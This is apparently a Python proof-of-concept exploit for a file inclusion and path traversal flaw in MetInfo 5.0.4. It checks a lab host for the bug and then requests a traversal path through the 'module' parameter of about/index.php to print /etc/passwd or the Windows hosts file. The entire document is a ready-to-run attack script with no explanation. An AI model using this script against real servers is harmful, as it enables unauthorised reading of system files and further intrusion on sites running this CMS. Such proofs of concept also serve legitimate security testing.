import requests,sys

url = "http://192.168.139.133"
fullUrl = url+"/MetInfo5.0.4/about/index.php?fmodule=7"

res = requests.get(url = fullUrl)

if (res.status_code == 200) and (not res.text) :

    f = [
        '../../../../../../../../../etc/passwd',
        'C:\Windows\System32\drivers\etc\hosts'
    ]
    flag = input("The Target is vulnerable! \nDo you want to continue?[Y/n]")

    if flag == 'n':
        print("DONE!")
        exit()

    cF = input("Please choice the path of file:\n1> {}\n2> {}\nWhat's your choice?".format(f[0],f[1]))

    if cF == '1':
        path = f[0]
    if cF == '2':
        path = f[1]
    
    
    fullUrl = url+"/MetInfo5.0.4/about/index.php?fmodule=7&module={}".format(path)
    res = requests.get(url = fullUrl)
    print(res.text)